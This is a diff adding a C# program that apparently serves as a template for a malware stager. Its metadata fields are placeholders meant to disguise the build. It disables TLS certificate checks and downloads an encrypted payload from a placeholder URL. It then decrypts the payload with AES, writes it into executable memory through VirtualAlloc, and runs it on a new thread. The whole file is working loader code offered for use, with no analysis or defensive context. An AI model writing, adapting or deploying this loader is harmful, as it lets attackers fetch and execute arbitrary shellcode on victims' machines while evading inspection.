@@ -1,0 +1,68 @@
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Reflection;
+
+[assembly: System.Reflection.AssemblyCompanyAttribute("[compania]")]
+[assembly: System.Reflection.AssemblyFileVersionAttribute("[versionarchivo]")]
+[assembly: System.Reflection.AssemblyInformationalVersionAttribute("[versionarchivo]")]
+[assembly: System.Reflection.AssemblyProductAttribute("[producto]")]
+[assembly: System.Reflection.AssemblyTitleAttribute("[titulo]")]
+[assembly: System.Reflection.AssemblyTrademark("[trademark]")]
+[assembly: System.Reflection.AssemblyDescription("[descripcion]")]
+[assembly: System.Reflection.AssemblyCopyright("[copyright]")]
+
+namespace wena
+{
+    public class xoro
+    {
+        public static string url = "cambiaraqui1";
+        public static string key = "cambiaraqui2";
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public static void DYE()
+        {
+            
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] concha = client.DownloadData(url);
+            byte[] desencriptar = AES_Decrypt(concha, key);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)desencriptar.Length, 0x3000, 0x40);
+            Marshal.Copy(desencriptar, 0, addr, desencriptar.Length);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            return;
+        }
+
+
+        public static byte[] AES_Decrypt(byte[] Data, string Pass)
+        {
+            SHA256Managed buffer_0 = new SHA256Managed();
+            byte[] Buffer1 = buffer_0.ComputeHash(Encoding.BigEndianUnicode.GetBytes(Pass));
+            AesCryptoServiceProvider buffer_2 = new AesCryptoServiceProvider();
+            buffer_2.KeySize = 256;
+            buffer_2.Key = Buffer1;
+            buffer_2.Mode = CipherMode.ECB;
+            byte[] Buffer2 = buffer_2.CreateDecryptor().TransformFinalBlock(Data, 0, Data.Length);
+            return Buffer2;
+
+
+        }
+
+
+        public static void Main(String[] args)
+        {
+            DYE();
+        }
+    }
+}
